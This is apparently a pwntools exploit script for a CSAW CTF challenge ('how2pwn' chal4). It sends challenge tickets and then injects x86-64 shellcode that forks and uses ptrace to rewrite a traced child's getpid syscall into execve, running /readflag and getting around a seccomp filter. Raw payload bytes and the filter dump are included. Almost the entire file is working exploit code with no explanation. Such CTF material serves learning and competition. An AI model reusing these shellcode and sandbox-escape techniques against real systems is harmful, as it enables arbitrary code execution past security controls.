#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./chal4")
host = args.HOST or "how2pwn.chal.csaw.io"
port = int(args.PORT or 60003)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

switch_to_x32 = b"\xc7\x44\x24\x04\x23\x00\x00\x00\xc7\x04\x24\x00\xd0\xea\x0d\xcb"

mmap = asm(
    """
xor rax, rax
mov al, 9
mov rdi, 0xdead000
mov rsi, 0x1000
mov rdx, 7
mov r10, 0x32
mov r8, 0xffffffff
mov r9, 0
syscall"""
)

read = asm(
    """
mov rax, 0
xor rdi, rdi
mov rsi, 0xdead000
mov rdx, 100
syscall"""
)

# ticket1: 764fce03d863b5155db4af260374acc1
# ticket2: 8e7bd9e37e38a85551d969e29b77e1ce
# re()

switch_to_x32 = b"\xc7\x44\x24\x04\x23\x00\x00\x00\xc7\x04\x24\x00\xd0\xea\x0d\xcb"

s(b"7a01505a0cfefc2f8249cb24e01a2890")
print(rl())

shellcode = nasm(
    """
_start:
  mov rbp, rsp
  mov rax, 57
  syscall                       ; fork()
  test eax, eax
  jz child
  mov [rbp + 0x8], rax          ; cpid
parent:
  lea r10, [rbp + 0x20]
  xor rdx, rdx
  lea rsi, [rbp + 0x10]
  mov rdi, [rbp + 0x8]
  mov rax, 61
  syscall                       ; wait4(cpid, &s, 0)
  mov r10, 1
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 0x4200
  mov rax, 101
  syscall                       ; ptrace(PTRACE_SETOPTIONS, cpid, 0, PTRACE_O_TRACESYSGOOD)
  
  .@Lp:
  xor r10, r10
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 24
  mov rax, 101
  syscall                       ; ptrace(PTRACE_SYSCALL, cpid, 0, 0)
  lea r10, [rbp + 0x20]
  xor rdx, rdx
  lea rsi, [rbp + 0x10]
  mov rdi, [rbp + 0x8]
  mov rax, 61
  syscall                       ; wait4(cpid, &s, 0)
  mov rax, [rbp + 0x10]
  mov rbx, rax
  and rbx, 0b1111111
  cmp rbx, 0b1111111
  jnz .@Skip
  shr rax, 8
  and rax, 0x80
  test eax, eax
  jz .@Skip
  lea r10, [rbp + 0x40]
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 12
  mov rax, 101
  syscall                       ; ptrace(PTRACE_GETREGS, cpid, 0, &r)
  mov rax, [rbp + 0x40 + 0x78]
  cmp rax, 39
  jnz .@Skip
  mov qword [rbp + 0x40 + 0x78], 59   ; dummy --> execve
  lea r10, [rbp + 0x40]
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 13
  mov rax, 101
  syscall                       ; ptrace(PTRACE_SETREGS, cpid, 0, &r)
  
  .@Skip:
  mov rax, [rbp + 0x10]
  and rax, 0b1111111
  test rax, rax
  jnz .@Lp
  
  jmp exit
child:
  xor r10, r10
  xor rdx, rdx
  xor rsi, rsi
  xor rdi, rdi
  mov rax, 101
  syscall                       ; ptrace(PTRACE_TRACEME, 0, 0, 0)
  mov rax, 39
  syscall
  mov rsi, 17
  mov rdi, rax
  mov rax, 62
  syscall                       ; kill(getpid(), SIGSTOP)
  ;  mov rax, 0x0068732f6e69622f
  mov rax, 0x616c66646165722f
  mov rbx, 0x0
  mov [rbp + 0x10], rax
  mov [rbp + 0x18], rbx
  lea rdi, [rbp + 0x10]
  xor rdx, rdx
  mov [rbp + 0x20], rdi
  mov qword [rbp + 0x28], 0
  lea rsi, [rbp + 0x20]
  mov rax, 39
  syscall                       ; dummy("/readflag", NULL, NULL)
  jmp exit
exit:
  mov rdi, 0
  mov rax, 60
  syscall
"""
)
pay = b"\x48\x89\xe5\x48\xc7\xc0\x39\x00\x00\x00\x0f\x05\x0f\x84\xb3\x00\x00\x00\x48\x89\x45\x08\x4c\x8d\x55\x20\x48\x31\xd2\x48\x8d\x75\x10\x48\x8b\x7d\x08\x48\xc7\xc0\x3d\x00\x00\x00\x0f\x05\x48\x31\xd2\x48\x8b\x75\x08\x48\xc7\xc7\x00\x42\x00\x00\x48\xc7\xc0\x65\x00\x00\x00\x0f\x05\x4d\x31\xd2\x48\x31\xd2\x48\x8b\x75\x08\x48\xc7\xc7\x18\x00\x00\x00\x48\xc7\xc0\x65\x00\x00\x00\x0f\x05\x48\x31\xd2\x48\x8d\x75\x10\x48\x8b\x7d\x08\x48\xc7\xc0\x3d\x00\x00\x00\x0f\x05\x48\x89\xc3\x48\x83\xe3\x7f\x48\x83\xfb\x7f\x48\x25\x80\x00\x00\x00\x85\xc0\x48\x31\xd2\x48\x8b\x75\x08\x48\xc7\xc7\x0c\x00\x00\x00\x48\xc7\xc0\x65\x00\x00\x00\x0f\x05\x48\x83\xf8\x27\x48\x31\xd2\x48\x8b\x75\x08\x48\xc7\xc7\x0d\x00\x00\x00\x48\xc7\xc0\x65\x00\x00\x00\x0f\x05\x48\x8b\x45\x10\x48\x83\xe0\x7f\x48\x85\xc0\xeb\x61\x4d\x31\xd2\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\xc7\xc0\x65\x00\x00\x00\x0f\x05\x0f\x05\x48\xc7\xc6\x11\x00\x00\x00\x48\x89\xc7\x48\xc7\xc0\x3e\x00\x00\x00\x0f\x05\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\xc7\xc3\x00\x00\x00\x00\x48\x89\x45\x10\x48\x89\x5d\x18\x48\x8d\x7d\x10\x48\x31\xd2\x48\x89\x7d\x20\x48\xc7\xc0\x27\x00\x00\x00\x0f\x05\x48\xc7\xc7\x00\x00\x00\x00\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05"

sl(b"\x90" + pay)
io.interactive()

"""
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x0000013d  if (A != seccomp) goto 0003
 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0003: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0005 setpgid
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x15 0x00 0x01 0x00000010  if (A != ioctl) goto 0007 lchown
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0009  umask
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x7ff00000  return TRACE

"""
